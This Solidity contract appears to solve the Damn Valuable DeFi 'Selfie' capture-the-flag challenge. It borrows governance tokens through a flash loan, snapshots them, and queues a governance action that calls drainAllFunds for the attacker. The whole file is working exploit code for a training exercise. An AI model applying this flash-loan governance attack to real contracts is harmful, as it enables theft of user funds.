// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "./DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract Attack {
    SelfiePool public selfiePool;
    SimpleGovernance public simpleGovernance;
    DamnValuableTokenSnapshot public damnValuableTokenSnapshot;
    uint256 private actionId;
    address private attacker;

    constructor(
        address _selfiePool,
        address _simpleGovernance,
        address _damnValuableTokenSnapshot,
        address _attacker
    ) {
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableTokenSnapshot = DamnValuableTokenSnapshot(
            _damnValuableTokenSnapshot
        );
        attacker = _attacker;
    }

    function attack() public {
        //Get some gorvernance tokens in order to be able to call queueAction func
        damnValuableTokenSnapshot.snapshot();
        selfiePool.flashLoan(
            ((damnValuableTokenSnapshot.getTotalSupplyAtLastSnapshot() * 6) /
                10)
        );
        // rest of logic in fallback function
    }

    function finishAttack() public {
        //call this function using "evm_increaseTime" by 2 days in order to be able to call
        //executeAction
        simpleGovernance.executeAction(actionId);
    }

    fallback() external payable {
        // console.log(damnValuableTokenSnapshot.balanceOf(address(this)));
        damnValuableTokenSnapshot.snapshot();

        //call queue action with drainAllFunds function  and attack contract address as arg
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", attacker),
            0
        );

        //transfer back tokens to pool in order to avoid "not paid back" error
        damnValuableTokenSnapshot.transfer(
            msg.sender,
            damnValuableTokenSnapshot.balanceOf(address(this))
        );
    }
}
